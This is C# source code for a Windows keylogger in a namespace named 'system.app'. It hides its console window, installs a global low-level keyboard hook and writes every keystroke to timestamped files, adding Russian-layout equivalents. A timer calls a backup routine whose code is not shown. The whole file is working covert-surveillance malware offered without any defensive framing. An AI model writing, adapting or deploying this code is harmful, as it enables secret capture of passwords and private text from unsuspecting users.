using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;
using System;
using System.Threading;
using sys.app.backup;
using Timer = System.Threading.Timer;

namespace system.app
{
  class Program
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static DateTime LastFlushTime = DateTime.Now;
    private static string AppPath = Application.StartupPath;

    private static readonly TimeSpan TimerPeriod = new TimeSpan(0, 0, 1, 0);
    private static readonly TimeSpan TimerDelay = new TimeSpan(0, 0, 0, 10);
    private static readonly AutoResetEvent AutoEvent = new AutoResetEvent(false);

    private static readonly Timer BackupTimer = new Timer(Manager.Backup, AutoEvent, TimerDelay, TimerPeriod);

    static void Main(string[] args)
    {
      try
      {
        var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
      }
      catch
      {
      }
    }

    private static string GetFileName()
    {
      var now = DateTime.Now;
      if ((now - LastFlushTime) > TimeSpan.FromMinutes(1))
        LastFlushTime = now;

      var fileName = LastFlushTime.ToString("yyyy-MM-dd_HH_mm") + ".kbl";
      return Path.Combine(AppPath, fileName);
    }

    private delegate IntPtr LowLevelKeyboardProc(
      int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      var text = string.Empty;
      try
      {
        if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
        {
          int vkCode = Marshal.ReadInt32(lParam);
          Console.WriteLine((Keys) vkCode);
          StreamWriter sw = new StreamWriter(GetFileName(), true);
          var code = (Keys) vkCode;
          text = code.ToString();
          if (EngRuConvertDictionary.ContainsKey(code))
            text = $"{text}\t({EngRuConvertDictionary[code]})";
          
          sw.WriteLine(text);
          sw.Close();
        }
      }
      catch (Exception e)
      {
        try
        {
          File.AppendAllText($"log_{DateTime.Now.Date:yy-MM-dd}.txt", $"Key code: {text}. Flushing error: {e.Message}{Environment.NewLine}");
        }
        catch (Exception exception)
        {
          Console.WriteLine(exception);
        }      
      }
      
      return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
      LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
      IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // The two dll imports below will handle the window hiding.

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
      using (Process curProcess = Process.GetCurrentProcess())
      using (ProcessModule curModule = curProcess.MainModule)
      {
        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
          GetModuleHandle(curModule.ModuleName), 0);
      }
    }

    private static Dictionary<Keys, string> EngRuConvertDictionary = new Dictionary<Keys, string>()
    {
      {Keys.A, "Ф"},
      {Keys.B, "И"},
      {Keys.C, "С"},
      {Keys.D, "В"},
      {Keys.E, "У"},
      {Keys.F, "А"},
      {Keys.G, "П"},
      {Keys.H, "Р"},
      {Keys.I, "Ш"},
      {Keys.J, "О"},
      {Keys.K, "Л"},
      {Keys.L, "Д"},
      {Keys.M, "Ь"},
      {Keys.N, "Т"},
      {Keys.O, "Щ"},
      {Keys.P, "З"},
      {Keys.Q, "Й"},
      {Keys.R, "К"},
      {Keys.S, "Ы"},
      {Keys.T, "Е"},
      {Keys.U, "Г"},
      {Keys.V, "М"},
      {Keys.W, "Ц"},
      {Keys.X, "Ч"},
      {Keys.Y, "Н"},
      {Keys.Z, "Я"},
      {Keys.OemOpenBrackets, "Х"},
      {Keys.Oem6, "Ъ"},
      {Keys.Oem1, "Ж"},
      {Keys.Oem7, "Э"},
      {Keys.Oem5, "/"},
      {Keys.Oemcomma, "Б"},
      {Keys.OemPeriod, "Ю"},
      {Keys.OemQuestion, ","}
    };
  }
}